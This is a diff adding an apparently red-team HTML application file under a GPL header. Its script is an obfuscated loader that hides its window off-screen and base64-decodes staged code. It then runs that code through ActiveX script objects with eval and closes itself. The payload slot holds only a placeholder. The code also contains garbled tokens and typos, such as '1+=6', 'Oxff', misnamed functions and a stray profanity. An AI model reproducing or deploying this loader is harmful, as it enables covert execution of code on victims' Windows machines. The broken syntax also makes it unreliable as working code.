@@ -1,0 +1,13 @@
+<!---------------------------------------------------------------------------------
+Copyright: (c) BLS OPS LLC.
+This program is free software: you can redistribute it and/or modify
+it under the terms of the GNU General Public License as published by
+the Free Software Foundation, version 3.
+This program is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+GNU General Public License for more details.
+You should have received a copy of the GNU General Public License
+along with this program. If not, see <https://www.gnu.org/licenses/>.
+--------------------------------------------------------------------------------->
+SOHfuck u<html><body><div id='varHtml'>BASE64</div><div id='compsCompareFunc'>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi jklmnopqrstuvwxyz0123456789+/</div><script language='javascript'>function compsForHtml(funcBrProc){return(new ActiveXObject(funcBrProc));}function brCore(forTo){return(defineCompareVariable.getElementById(forTo).innerHTML);}function defineProcBr(){return(brCore ('compsCompareFunc'));}function compareHtmlBr(brHtml){return('char' + brHtml);}function iCore(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var varFor=''; var w=String.fromCharCode; var L=s.length;var iFunc = compareHtm1Br('At');for(i=0;i<64;i++){e[defineProcBr()[iFunc](i)]=i;}for(x=0;x<L;x++)(c=e[s[iFunc](x)];b=(b<<6)+c;1+=6;while(1>=8){((a=(b>>>(1-=8))&Oxff)||(x<(L-2)))&&(varFor+=w(a));))return(varFor);};function procVar(htmlForFunc){return htmlForFunc.split('').reverse().join('');}function compareIVar(brHtml){return(iCore(brHtml));}function brFuncDefine(brHtml, variableCore){return(brHtml.split(variableCore));}forHtmlFunc = window;defineCompareVariable = document;forHtmlFunc.resizeTo(3, 3);forHtmlFunc.moveTo(-121, -121);var toFuncI = brFuncDefine(brCore('varHtml'),'Z28x');var compareFunc = compareIVar(toFuncI[0]);var procCompare = compareIVar(toFuncI[1]);var defineVarFunc = compareIVar(toFuncI[2]);</script><script language="javascript">function codeVariableHtml(brCompareCode, coreVarCompare){var forToVar = function(htmlForFunc){if(coreVarCompare !== ""){return(new Function(htmlForFunc));}};forToVar(brCompareCode)();}</script><script language='vbscript'>Function compareProcProc(varHtml):Set iBr = CreateObject(defineVarFunc):With iBr:.language = "jscript":.timeout = 60 * 1000 * 8:End With:iBr.eval(codeVariabletHtml(varHtml, "brHtml")):End Function</script><script language='vbscript'>Call compareProcProc(compareFunc)</script><script language='vbscript'>Call compareProcProc(procCompare)</script><script language='javascript'>forHtmlFunc['close']();</script></body></html>
